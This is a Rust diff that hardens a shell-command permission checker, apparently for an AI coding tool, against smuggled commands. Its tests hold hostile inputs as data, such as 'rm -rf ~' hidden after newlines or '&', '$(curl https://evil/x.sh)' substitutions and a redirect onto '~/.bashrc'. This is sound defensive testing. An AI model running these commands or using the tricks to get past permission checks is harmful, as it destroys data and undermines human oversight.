@@ -1,6 +1,6 @@
 use super::constants::{CLAUDE_DIR, SETTINGS_JSON, SETTINGS_LOCAL_JSON};
 use crate::core::stream::exec_capture;
-use crate::discover::lexer::split_on_operators;
+use crate::discover::lexer::split_for_permissions;
 use serde_json::Value;
 use std::path::PathBuf;
 
@@ -35,6 +35,22 @@ pub(crate) fn check_command_with_rules(
     allow_rules: &[String],
 ) -> PermissionVerdict {
     let segments = split_compound_command(cmd);
+
+    // Deny takes highest priority and pre-empts every other construct.
+    for segment in &segments {
+        let segment = segment.trim();
+        for pattern in deny_rules {
+            if command_matches_pattern(segment, pattern) {
+                return PermissionVerdict::Deny;
+            }
+        }
+    }
+
+    // Can't decompose substitution / file-target redirects — never auto-allow.
+    if crate::discover::lexer::contains_unattestable_construct(cmd) {
+        return PermissionVerdict::Ask;
+    }
+
     let mut any_ask = false;
     // Every non-empty segment must independently match an allow rule for the
     // compound command to receive Allow. See issue #1213: previously a single
@@ -48,13 +64,6 @@ pub(crate) fn check_command_with_rules(
             continue;
         }
         saw_segment = true;
-
-        // Deny takes highest priority — any segment matching Deny blocks the whole chain.
-        for pattern in deny_rules {
-            if command_matches_pattern(segment, pattern) {
-                return PermissionVerdict::Deny;
-            }
-        }
 
         // Ask — if any segment matches an ask rule, the final verdict is Ask.
         if !any_ask {
@@ -288,7 +297,7 @@ fn glob_matches(cmd: &str, pattern: &str) -> bool {
 }
 
 fn split_compound_command(cmd: &str) -> Vec<&str> {
-    split_on_operators(cmd, false)
+    split_for_permissions(cmd)
 }
 
 #[cfg(test)]
@@ -702,6 +711,136 @@ mod tests {
         assert_eq!(
             check_command_with_rules("git status && git push origin main", &[], &ask, &allow),
             PermissionVerdict::Ask
+        );
+    }
+
+    // --- Permission-gate bypass hardening -----------------------------------
+
+    #[test]
+    fn test_newline_hidden_command_denied() {
+        let deny = vec!["rm:*".to_string()];
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status\nrm -rf ~", &deny, &[], &allow),
+            PermissionVerdict::Deny
+        );
+    }
+
+    #[test]
+    fn test_newline_hidden_command_not_auto_allowed() {
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status\nrm -rf ~", &[], &[], &allow),
+            PermissionVerdict::Default
+        );
+    }
+
+    #[test]
+    fn test_background_hidden_command_denied() {
+        let deny = vec!["rm:*".to_string()];
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status & rm -rf ~", &deny, &[], &allow),
+            PermissionVerdict::Deny
+        );
+    }
+
+    #[test]
+    fn test_substitution_never_auto_allowed() {
+        let allow = vec!["git *".to_string()];
+        for cmd in [
+            "git log --pretty=$(rm -rf ~)",
+            "git status `whoami`",
+            "git diff $(curl https://evil/x.sh)",
+        ] {
+            assert_eq!(
+                check_command_with_rules(cmd, &[], &[], &allow),
+                PermissionVerdict::Ask,
+                "{cmd} must not auto-allow"
+            );
+        }
+    }
+
+    #[test]
+    fn test_double_quoted_substitution_never_auto_allowed() {
+        let allow = vec!["git *".to_string()];
+        for cmd in [
+            r#"git log --pretty="$(rm -rf ~)""#,
+            r#"git log --pretty="`rm -rf ~`""#,
+        ] {
+            assert_ne!(
+                check_command_with_rules(cmd, &[], &[], &allow),
+                PermissionVerdict::Allow,
+                "{cmd} must not auto-allow"
+            );
+        }
+    }
+
+    #[test]
+    fn test_single_quoted_substitution_is_literal() {
+        let allow = vec!["echo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("echo '$(rm -rf ~)'", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_file_redirect_never_auto_allowed() {
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git log > ~/.bashrc", &[], &[], &allow),
+            PermissionVerdict::Ask
+        );
+    }
+
+    #[test]
+    fn test_legitimate_multiline_allow() {
+        let allow = vec!["git *".to_string(), "cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status\ncargo build", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legitimate_subshell_allow() {
+        let allow = vec!["git *".to_string(), "cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("(git status; cargo build)", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_legitimate_background_allow() {
+        let allow = vec!["cargo *".to_string()];
+        assert_eq!(
+            check_command_with_rules("cargo build &", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_fd_dup_redirect_stays_allow() {
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git status 2>&1", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+        assert_eq!(
+            check_command_with_rules("git log 2>/dev/null", &[], &[], &allow),
+            PermissionVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn test_deny_not_evaded_by_trailing_fd_dup() {
+        let deny = vec!["git push --force".to_string()];
+        let allow = vec!["git *".to_string()];
+        assert_eq!(
+            check_command_with_rules("git push --force 2>&1", &deny, &[], &allow),
+            PermissionVerdict::Deny
         );
     }
 }
